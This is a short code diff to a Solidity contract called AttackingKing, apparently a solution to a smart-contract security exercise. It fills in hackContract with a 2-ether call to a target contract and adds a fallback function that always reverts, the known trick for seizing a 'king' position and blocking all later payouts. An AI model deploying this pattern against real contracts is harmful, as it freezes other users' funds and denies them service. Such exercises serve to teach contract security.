@@ -11,6 +11,10 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        (bool success, ) = address(contractAddress).call{ value: 2 ether }("");
+    }
+
+    fallback() external { 
+        revert("EVIL KING!!!");
     }
 }
